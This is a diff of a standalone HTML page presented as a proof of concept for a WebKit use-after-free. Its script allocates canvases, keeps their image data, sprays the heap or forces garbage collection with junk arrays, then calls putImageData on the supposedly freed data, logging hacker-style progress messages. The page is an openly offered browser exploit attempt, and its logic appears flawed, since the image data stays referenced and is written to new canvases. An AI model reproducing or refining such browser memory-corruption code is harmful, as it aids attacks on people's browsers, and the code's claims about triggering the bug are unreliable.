@@ -1,70 +1,69 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>WebKit UAF Crash Test</title>
+  <title>PoC WebKit UAF Visual</title>
   <style>
-    body { background: #000; color: #0f0; font-family: monospace; }
+    body { background: black; color: lime; font-family: monospace; }
+    #log { white-space: pre-wrap; }
   </style>
 </head>
 <body>
-  <h1>Testing WebKit UAF...</h1>
+  <h1>UAF Test Running...</h1>
+  <div id="log"></div>
+
   <script>
-    const canvases = [];
-    const data = [];
-
-    function allocCanvas(i) {
-      const c = document.createElement("canvas");
-      c.width = 256;
-      c.height = 256;
-      const ctx = c.getContext("2d");
-      ctx.fillStyle = "red";
-      ctx.fillRect(0, 0, 256, 256);
-      canvases.push(c);
-      data.push(ctx.getImageData(0, 0, 256, 256));
+    const log = document.getElementById("log");
+    function print(msg) {
+      log.textContent += msg + "\n";
     }
 
-    function sprayHeap() {
-      let spray = [];
-      for (let i = 0; i < 10000; i++) {
-        spray.push(new Uint32Array(100));
+    let canvases = [], data = [];
+
+    function allocAll() {
+      for (let i = 0; i < 50; i++) {
+        let c = document.createElement("canvas");
+        c.width = 128;
+        c.height = 128;
+        let ctx = c.getContext("2d");
+        ctx.fillStyle = "red";
+        ctx.fillRect(0, 0, 128, 128);
+        canvases.push(c);
+        data.push(ctx.getImageData(0, 0, 128, 128));
       }
-      return spray;
+      print("[+] Allocated canvases and captured imageData");
     }
 
-    function triggerUAF() {
-      let container = document.createElement("div");
-      document.body.appendChild(container);
-
-      for (let i = 0; i < 100; i++) {
-        allocCanvas(i);
-        container.appendChild(canvases[i]);
+    function gcFill() {
+      for (let i = 0; i < 2000; i++) {
+        let junk = new Array(1000).fill(i);
       }
+      print("[+] GC filled with junk arrays");
+    }
 
-      // Trigger GC
-      for (let i = 0; i < 1000; i++) {
-        new Array(1000).fill(i.toString());
-      }
+    function freeAndCrash() {
+      canvases = []; // free references
+      gcFill();
+      print("[+] Attempting putImageData on freed contexts...");
 
-      // Remove canvases
-      container.innerHTML = "";
-      console.log("[+] Canvases removed");
-
-      let spray = sprayHeap();
-
-      // Try reuse imageData
-      for (let i = 0; i < 100; i++) {
-        try {
-          let ctx = canvases[i].getContext("2d");
-          ctx.putImageData(data[i], 0, 0);
-        } catch (e) {
-          console.log("[-] Exception:", e.message);
+      try {
+        for (let i = 0; i < 50; i++) {
+          let canvas = document.createElement("canvas");
+          canvas.width = 128;
+          canvas.height = 128;
+          let ctx = canvas.getContext("2d");
+          ctx.putImageData(data[i], 0, 0); // UAF attempt
         }
+      } catch (e) {
+        print("[-] Exception: " + e.message);
       }
 
-      console.log("[+] Done. If browser didn't crash, check logs.");
+      print("[+] Done with attempt.\n");
     }
 
-    setTimeout(triggerUAF, 1000);
+    setTimeout(() => {
+      allocAll();
+      setTimeout(freeAndCrash, 1000);
+    }, 100);
   </script>
 </body>
 </html>
